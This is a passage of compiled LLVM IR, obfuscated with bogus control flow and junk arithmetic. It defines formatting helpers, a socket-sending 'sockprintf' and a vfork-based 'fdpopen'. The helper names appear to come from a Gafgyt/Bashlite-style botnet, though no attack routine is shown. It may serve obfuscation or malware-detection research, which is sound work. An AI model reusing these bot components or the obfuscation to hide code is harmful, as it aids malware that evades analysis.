originalBB38:                                     ; preds = %originalBB38alteredBB, %206
  %215 = load i8**, i8*** %5, align 8
  %216 = load i32, i32* %10, align 4
  call void @printchar(i8** %215, i32 %216)
  %217 = load i32, i32* %9, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %9, align 4
  %219 = load i32, i32* @x.9
  %220 = load i32, i32* @y.10
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart254, label %originalBB38alteredBB

originalBBpart254:                                ; preds = %originalBB38
  br label %227

; <label>:227:                                    ; preds = %originalBBpart254
  %228 = load i32, i32* %7, align 4
  %229 = add nsw i32 %228, -1
  store i32 %229, i32* %7, align 4
  br label %187

; <label>:230:                                    ; preds = %originalBBpart236
  %231 = load i32, i32* @x.9
  %232 = load i32, i32* @y.10
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %230
  %239 = load i32, i32* %9, align 4
  %240 = load i32, i32* @x.9
  %241 = load i32, i32* @y.10
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  ret i32 %239

originalBBalteredBB:                              ; preds = %originalBB, %27
  %248 = load i32, i32* %11, align 4
  %249 = load i32, i32* %7, align 4
  %250 = icmp sge i32 %248, %249
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %251 = load i32, i32* %8, align 4
  %_ = sub i32 %251, 2
  %gen = mul i32 %_, 2
  %252 = and i32 %251, 2
  %253 = icmp ne i32 %252, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  %254 = load i32, i32* %8, align 4
  %_11 = sub i32 %254, 1
  %gen12 = mul i32 %_11, 1
  %255 = and i32 %254, 1
  %256 = icmp ne i32 %255, 0
  br label %originalBB10

originalBB16alteredBB:                            ; preds = %originalBB16, %110
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %130
  %257 = load i8**, i8*** %5, align 8
  %258 = load i32, i32* %10, align 4
  call void @printchar(i8** %257, i32 %258)
  %259 = load i32, i32* %9, align 4
  %_21 = sub i32 %259, 1
  %gen22 = mul i32 %_21, 1
  %_23 = sub i32 %259, 1
  %gen24 = mul i32 %_23, 1
  %_25 = shl i32 %259, 1
  %_26 = shl i32 %259, 1
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  br label %originalBB20

originalBB30alteredBB:                            ; preds = %originalBB30, %155
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %187
  %261 = load i32, i32* %7, align 4
  %262 = icmp sgt i32 %261, 0
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %206
  %263 = load i8**, i8*** %5, align 8
  %264 = load i32, i32* %10, align 4
  call void @printchar(i8** %263, i32 %264)
  %265 = load i32, i32* %9, align 4
  %_39 = sub i32 0, %265
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 %265, 1
  %gen42 = mul i32 %_41, 1
  %_43 = shl i32 %265, 1
  %_44 = sub i32 %265, 1
  %gen45 = mul i32 %_44, 1
  %_46 = shl i32 %265, 1
  %_47 = shl i32 %265, 1
  %_48 = sub i32 0, %265
  %gen49 = add i32 %_48, 1
  %_50 = sub i32 %265, 1
  %gen51 = mul i32 %_50, 1
  %_52 = shl i32 %265, 1
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %9, align 4
  br label %originalBB38

originalBB56alteredBB:                            ; preds = %originalBB56, %230
  %267 = load i32, i32* %9, align 4
  br label %originalBB56
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %150

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %33
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.11
  %45 = load i32, i32* @y.12
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %61

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* %11, align 4
  %54 = icmp eq i32 %53, 10
  br i1 %54, label %55, label %61

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %10, align 4
  %57 = icmp slt i32 %56, 0
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %55
  store i32 1, i32* %19, align 4
  %59 = load i32, i32* %10, align 4
  %60 = sub nsw i32 0, %59
  store i32 %60, i32* %21, align 4
  br label %61

; <label>:61:                                     ; preds = %58, %55, %52, %originalBBpart2
  %62 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %63 = getelementptr inbounds i8, i8* %62, i64 12
  %64 = getelementptr inbounds i8, i8* %63, i64 -1
  store i8* %64, i8** %17, align 8
  %65 = load i8*, i8** %17, align 8
  store i8 0, i8* %65, align 1
  br label %66

; <label>:66:                                     ; preds = %originalBBpart214, %61
  %67 = load i32, i32* %21, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %106

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* %21, align 4
  %71 = load i32, i32* %11, align 4
  %72 = urem i32 %70, %71
  store i32 %72, i32* %18, align 4
  %73 = load i32, i32* %18, align 4
  %74 = icmp sge i32 %73, 10
  br i1 %74, label %75, label %81

; <label>:75:                                     ; preds = %69
  %76 = load i32, i32* %15, align 4
  %77 = sub nsw i32 %76, 48
  %78 = sub nsw i32 %77, 10
  %79 = load i32, i32* %18, align 4
  %80 = add nsw i32 %79, %78
  store i32 %80, i32* %18, align 4
  br label %81

; <label>:81:                                     ; preds = %75, %69
  %82 = load i32, i32* @x.11
  %83 = load i32, i32* @y.12
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %81
  %90 = load i32, i32* %18, align 4
  %91 = add nsw i32 %90, 48
  %92 = trunc i32 %91 to i8
  %93 = load i8*, i8** %17, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 -1
  store i8* %94, i8** %17, align 8
  store i8 %92, i8* %94, align 1
  %95 = load i32, i32* %11, align 4
  %96 = load i32, i32* %21, align 4
  %97 = udiv i32 %96, %95
  store i32 %97, i32* %21, align 4
  %98 = load i32, i32* @x.11
  %99 = load i32, i32* @y.12
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br label %66

; <label>:106:                                    ; preds = %66
  %107 = load i32, i32* @x.11
  %108 = load i32, i32* @y.12
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp ne i32 %115, 0
  %117 = load i32, i32* @x.11
  %118 = load i32, i32* @y.12
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %116, label %125, label %142

; <label>:125:                                    ; preds = %originalBBpart218
  %126 = load i32, i32* %13, align 4
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %128, label %138

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* %14, align 4
  %130 = and i32 %129, 2
  %131 = icmp ne i32 %130, 0
  br i1 %131, label %132, label %138

; <label>:132:                                    ; preds = %128
  %133 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %133, i32 45)
  %134 = load i32, i32* %20, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %20, align 4
  %136 = load i32, i32* %13, align 4
  %137 = add nsw i32 %136, -1
  store i32 %137, i32* %13, align 4
  br label %141

; <label>:138:                                    ; preds = %128, %125
  %139 = load i8*, i8** %17, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 -1
  store i8* %140, i8** %17, align 8
  store i8 45, i8* %140, align 1
  br label %141

; <label>:141:                                    ; preds = %138, %132
  br label %142

; <label>:142:                                    ; preds = %141, %originalBBpart218
  %143 = load i32, i32* %20, align 4
  %144 = load i8**, i8*** %9, align 8
  %145 = load i8*, i8** %17, align 8
  %146 = load i32, i32* %13, align 4
  %147 = load i32, i32* %14, align 4
  %148 = call i32 @prints(i8** %144, i8* %145, i32 %146, i32 %147)
  %149 = add nsw i32 %143, %148
  store i32 %149, i32* %8, align 4
  br label %150

; <label>:150:                                    ; preds = %142, %25
  %151 = load i32, i32* %8, align 4
  ret i32 %151

originalBBalteredBB:                              ; preds = %originalBB, %33
  %152 = load i32, i32* %12, align 4
  %153 = icmp ne i32 %152, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %81
  %154 = load i32, i32* %18, align 4
  %_ = sub i32 %154, 48
  %gen = mul i32 %_, 48
  %_2 = sub i32 0, %154
  %gen3 = add i32 %_2, 48
  %_4 = sub i32 %154, 48
  %gen5 = mul i32 %_4, 48
  %_6 = shl i32 %154, 48
  %_7 = shl i32 %154, 48
  %_8 = shl i32 %154, 48
  %155 = add nsw i32 %154, 48
  %156 = trunc i32 %155 to i8
  %157 = load i8*, i8** %17, align 8
  %158 = getelementptr inbounds i8, i8* %157, i32 -1
  store i8* %158, i8** %17, align 8
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %11, align 4
  %160 = load i32, i32* %21, align 4
  %_9 = shl i32 %160, %159
  %_10 = sub i32 %160, %159
  %gen11 = mul i32 %_10, %159
  %_12 = shl i32 %160, %159
  %161 = udiv i32 %160, %159
  store i32 %161, i32* %21, align 4
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %106
  %162 = load i32, i32* %19, align 4
  %163 = icmp ne i32 %162, 0
  br label %originalBB16
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  %19 = load i32, i32* @x.13
  %20 = load i32, i32* @y.14
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* @x.13
  %28 = load i32, i32* @y.14
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %18
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 114
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %35

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i8*, i8** %13, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp ne i32 %33, 119
  br i1 %34, label %41, label %35

; <label>:35:                                     ; preds = %30, %originalBBpart2
  %36 = load i8*, i8** %13, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %30
  store i32 -1, i32* %11, align 4
  br label %269

; <label>:42:                                     ; preds = %35
  %43 = load i32, i32* @x.19
  %44 = load i32, i32* @y.20
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %52 = call i32 @pipe(i32* %51) #2
  %53 = icmp slt i32 %52, 0
  %54 = load i32, i32* @x.19
  %55 = load i32, i32* @y.20
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %53, label %62, label %79

; <label>:62:                                     ; preds = %originalBBpart24
  %63 = load i32, i32* @x.19
  %64 = load i32, i32* @y.20
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %62
  store i32 -1, i32* %11, align 4
  %71 = load i32, i32* @x.19
  %72 = load i32, i32* @y.20
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %269

; <label>:79:                                     ; preds = %originalBBpart24
  %80 = load i32, i32* @x.19
  %81 = load i32, i32* @y.20
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %79
  %88 = load i32*, i32** @fdopen_pids, align 8
  %89 = icmp eq i32* %88, null
  %90 = load i32, i32* @x.19
  %91 = load i32, i32* @y.20
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %89, label %98, label %134

; <label>:98:                                     ; preds = %originalBBpart212
  %99 = call i32 @getdtablesize() #2
  store i32 %99, i32* %16, align 4
  %100 = icmp sle i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %98
  store i32 -1, i32* %11, align 4
  br label %269

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* %16, align 4
  %104 = sext i32 %103 to i64
  %105 = mul i64 %104, 4
  %106 = trunc i64 %105 to i32
  %107 = zext i32 %106 to i64
  %108 = call noalias i8* @malloc(i64 %107) #2
  %109 = bitcast i8* %108 to i32*
  store i32* %109, i32** @fdopen_pids, align 8
  %110 = icmp eq i32* %109, null
  br i1 %110, label %111, label %128

; <label>:111:                                    ; preds = %102
  %112 = load i32, i32* @x.19
  %113 = load i32, i32* @y.20
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %111
  store i32 -1, i32* %11, align 4
  %120 = load i32, i32* @x.19
  %121 = load i32, i32* @y.20
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %269

; <label>:128:                                    ; preds = %102
  %129 = load i32*, i32** @fdopen_pids, align 8
  %130 = bitcast i32* %129 to i8*
  %131 = load i32, i32* %16, align 4
  %132 = sext i32 %131 to i64
  %133 = mul i64 %132, 4
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 %133, i32 1, i1 false)
  br label %134

; <label>:134:                                    ; preds = %128, %originalBBpart212
  %135 = load i32, i32* @x.19
  %136 = load i32, i32* @y.20
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %134
  %143 = call i32 @vfork() #11
  store i32 %143, i32* %17, align 4
  %144 = load i32, i32* @x.19
  %145 = load i32, i32* @y.20
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  switch i32 %143, label %213 [
    i32 -1, label %152
    i32 0, label %159
  ]

; <label>:152:                                    ; preds = %originalBBpart220
  %153 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @close(i32 %154)
  %156 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %157 = load i32, i32* %156, align 4
  %158 = call i32 @close(i32 %157)
  store i32 -1, i32* %11, align 4
  br label %269

; <label>:159:                                    ; preds = %originalBBpart220
  %160 = load i8*, i8** %13, align 8
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 114
  br i1 %163, label %164, label %195

; <label>:164:                                    ; preds = %159
  %165 = load i32, i32* @x.19
  %166 = load i32, i32* @y.20
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %164
  %173 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %174 = load i32, i32* %173, align 4
  %175 = icmp ne i32 %174, 1
  %176 = load i32, i32* @x.19
  %177 = load i32, i32* @y.20
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %175, label %184, label %191

; <label>:184:                                    ; preds = %originalBBpart224
  %185 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %186 = load i32, i32* %185, align 4
  %187 = call i32 @dup2(i32 %186, i32 1) #2
  %188 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %189 = load i32, i32* %188, align 4
  %190 = call i32 @close(i32 %189)
  br label %191

; <label>:191:                                    ; preds = %184, %originalBBpart224
  %192 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %193 = load i32, i32* %192, align 4
  %194 = call i32 @close(i32 %193)
  br label %210

; <label>:195:                                    ; preds = %159
  %196 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %197 = load i32, i32* %196, align 4
  %198 = icmp ne i32 %197, 0
  br i1 %198, label %199, label %206

; <label>:199:                                    ; preds = %195
  %200 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
